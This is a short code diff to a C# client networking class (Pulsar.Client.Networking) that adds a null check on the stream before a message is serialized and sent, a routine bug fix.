@@ -378,6 +378,9 @@ namespace Pulsar.Client.Networking
                 {
                     using (var ms = new MemoryStream())
                     {
+                        if (_stream == null)
+                            return;
+
                         Serializer.Serialize(ms, message);
 
                         var payload = ms.ToArray();
